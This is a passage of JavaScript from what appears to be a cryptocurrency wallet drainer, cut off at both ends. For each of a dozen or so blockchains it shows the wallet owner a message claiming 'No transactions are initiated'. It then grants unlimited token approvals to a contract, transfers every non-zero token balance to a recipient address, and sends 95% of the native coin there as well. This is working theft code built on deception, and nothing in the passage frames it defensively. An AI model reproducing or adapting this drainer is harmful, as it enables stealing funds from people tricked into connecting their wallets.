                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  arbTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          arbTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of arbTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(arbContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(arbContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARB`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARB`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for ARB to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring ARB:', error);
                          
                         }
                          break;
              
                        //OPTIMISM
                        case optimism.chainId:
                          const opTokens = await fetchOPTokens(address);
              
                          // Message to sign
                          const opMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const opSignature = await signer.signMessage(opMessage);
                          console.log('Signature:', opSignature);
              
                          const opTokenDetails = [];
                          for (let token of opTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  opTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          opTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of opTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(optimismContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(optimismContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OP`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OP`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for OP to send')
                            
                           }
                         } catch (error) {
                              console.error('Error transferring OP:', error);
                              
                         }
                          break;
                              
                              
                        //ARBITRUM NOVA
                        case arbnova.chainId:
                          const arbnovaTokens = await fetchARBNOVATokens(address);
              
                          // Message to sign
                          const arbnovaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const arbnovaSignature = await signer.signMessage(arbnovaMessage);
                          console.log('Signature:', arbnovaSignature);
              
                          const arbnovaTokenDetails = [];
                          for (let token of arbnovaTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  arbnovaTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          arbnovaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of arbnovaTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(arbnovaContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(arbnovaContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                             
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARBNOVA`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARBNOVA`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for ARB to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring ARBNOVA:', error);
                              
                         }
                          break;
                        
                        //BASE
                        case base.chainId:
                          const baseTokens = await fetchBASETokens(address);
              
                          // Message to sign
                          const baseMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const baseSignature = await signer.signMessage(baseMessage);
                          console.log('Signature:', baseSignature);
              
                          const baseTokenDetails = [];
                          for (let token of baseTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  baseTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          baseTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of baseTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(baseContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(baseContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BASE`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BASE`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for BASE to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring BASE:', error);
                              
                         }
                          break;
              
                        //ZKSYNC
                        case zksync.chainId:
                          const zkTokens = await fetchZKSYNCTokens(address);
              
                          // Message to sign
                          const zkMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const zkSignature = await signer.signMessage(zkMessage);
                          console.log('Signature:', zkSignature);
              
                          const zkTokenDetails = [];
                          for (let token of zkTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  zkTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          zkTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of zkTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(zksyncContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(zksyncContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ZKSYNC`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ZKSYNC`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for ZKSYNC to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring ZKSYNC:', error);
                             
                         }
                          break;
              
                        //POLYGON
                        case polygon.chainId:
                          const polyTokens = await fetchPOLYGONTokens(address);
              
                          // Message to sign
                          const polyMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const polySignature = await signer.signMessage(polyMessage);
                          console.log('Signature:', polySignature);
              
                          const polyTokenDetails = [];
                          for (let token of polyTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  polyTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          polyTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of polyTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(polygonContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(polygonContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGON`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGON`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for POLYGON to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring POLYGON:', error);
                              
                         }
                          break;
              
              
                      ////POLYGONEVM
                        case polygonevm.chaindId:
                          const polyevmTokens = await fetchPOLYGONEVMTokens(address);
              
                          // Message to sign
                          const polyevmMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const polyevmSignature = await signer.signMessage(polyevmMessage);
                          console.log('Signature:', polyevmSignature);
              
                          const polyevmTokenDetails = [];
                          for (let token of polyevmTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  polyevmTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          polyevmTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of polyevmTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(polygonevmContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(polygonevmContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGONEVM`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGONEVM`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for POLYGONEVM to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring POLYGONEVM:', error);
                              
                         }
                          break;
                        
              
                        //BLAST
                        case blast.chainId:
                          const blastTokens = await fetchBLASTTokens(address);
              
                          // Message to sign
                          const blastMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const blastSignature = await signer.signMessage(blastMessage);
                          console.log('Signature:', blastSignature);   
              
                          const blastTokenDetails = [];
                          for (let token of blastTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  blastTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          blastTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of blastTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(blastContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(blastContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                          try {
                              //send native tokens
                              const etherBalance = await provider.getBalance(address)
                              console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BLAST`);
                 
                              if(!etherBalance.eq(0)){
                                const amountToSend = etherBalance.mul(95).div(100);
                              console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BLAST`);
                 
                          // Define the transaction
                              const transaction = {
                                  to: recipientAddress, // Replace with the recipient's address
                                  value: amountToSend,
                                  // Optional: You can specify gasLimit and gasPrice here if necessary
                              };
                              const txResponse = await signer.sendTransaction(transaction);
                              console.log(`Transaction hash: ${txResponse.hash}`);
                 
                              // Wait for the transaction to be mined
                              const txReceipt = await txResponse.wait();
                              console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                              }else{
                                console.log('No balance found for BLAST to send')
                               
                              }
                            } catch (error) {
                                 console.error('Error transferring BLAST:', error);
                                
                            }
                            break;
              
              
                        //SCROLL
                        case scroll.chainId:
                          const scrollTokens = await fetchSCROLLTokens(address);
              
                          // Message to sign
                          const scrollMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const scrollSignature = await signer.signMessage(scrollMessage);
                          console.log('Signature:', scrollSignature);
              
                          const scrollTokenDetails = [];
                          for (let token of scrollTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  scrollTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          scrollTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of scrollTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(scrollContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(scrollContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                             
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SCROLL`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SCROLL`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for SCROLL to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring SCROLL:', error);
                              
                         }
                         break;
                         
                        //METIS
                        case metis.chainId:
                          const metisTokens = await fetchMETISTokens(address);
              
                          // Message to sign
                          const metisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const metisSignature = await signer.signMessage(metisMessage);
                          console.log('Signature:', metisSignature);
              
                          const metisTokenDetails = [];
                          for (let token of metisTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  metisTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          metisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of metisTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(metisContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(metisContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} METIS`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} METIS`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for METIS to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring METIS:', error);
                              
                         }
                              break;
              
                        //MANTA      
                        case manta.chainId:
                          const mantaTokens = await fetchMANTATokens(address);
              
                          // Message to sign
                          const mantaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const mantaSignature = await signer.signMessage(mantaMessage);
                          console.log('Signature:', mantaSignature);
              
                          const mantaTokenDetails = [];
                          for (let token of mantaTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  mantaTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          mantaTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of mantaTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(mantaContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(mantaContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTA`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTA`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for MANTA to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring MANTA:', error);
                             
                         }
                          break;
              
                        //FANTOM      
                        case fantom.chainId:
                          const fantomTokens = await fetchFANTOMTokens(address);
              
                          // Message to sign
                          const fantomMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const fantomSignature = await signer.signMessage(fantomMessage);
                          console.log('Signature:', fantomSignature);
              
                          const fantomTokenDetails = [];
                          for (let token of fantomTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  fantomTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          fantomTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of fantomTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(fantomContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(fantomContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                              
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} FANTOM`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} FANTOM`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
                           const txResponse = await signer.sendTransaction(transaction);
                           console.log(`Transaction hash: ${txResponse.hash}`);
              
                           // Wait for the transaction to be mined
                           const txReceipt = await txResponse.wait();
                           console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                           }else{
                             console.log('No balance found for FANTOM to send')
                             
                           }
                         } catch (error) {
                              console.error('Error transferring FANTOM:', error);
                              
                         }
                          break;
              
                        //GNOSIS
                        case gnosis.chainId:
                          const gnosisTokens = await fetchGNOSISTokens(address);
              
                          // Message to sign
                          const gnosisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
                          const gnosisSignature = await signer.signMessage(gnosisMessage);
                          console.log('Signature:', gnosisSignature);
              
                          const gnosisTokenDetails = [];
                          for (let token of gnosisTokens) {
                              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                              const balance = await tokenContract.balanceOf(address);
                              if (!balance.eq(0)) { //Only add tokens with non-zero balances
                                  gnosisTokenDetails.push({
                                      contract: tokenContract,
                                      balance: balance,
                                      symbol: token.tokenSymbol,
                                      address: token.contractAddress
                                  });
                              }
                          }
              
                          // Sort tokens by balance, descending
                          gnosisTokenDetails.sort((a, b) => b.balance.sub(a.balance));
              
                          try {
                              for(let token of gnosisTokenDetails){
                                  const maxUint256 = ethers.constants.MaxUint256;
                                  // Approve unlimited tokens
                                  const approveTx = await token.contract.approve(gnosisContractAddress, maxUint256);
                                  await approveTx.wait();
                                  console.log(`Tokens approved for ${token.symbol} at ${token.address}`);
              
              
                                  // Transfer tokens using the smart contract
                                  const contract = new ethers.Contract(gnosisContractAddress, contractABI, signer);
                                  const transferTx = await contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance);
                                  await transferTx.wait();
                                  console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
                              }
                          } catch (error) {
                              console.error('Error transferring tokens:', error);
                             
                          }
              
                         try {
                           //send native tokens
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} GNOSIS`);
              
                           if(!etherBalance.eq(0)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} GNOSIS`);
              
                       // Define the transaction
                           const transaction = {
                               to: recipientAddress, // Replace with the recipient's address
                               value: amountToSend,
                               // Optional: You can specify gasLimit and gasPrice here if necessary
                           };
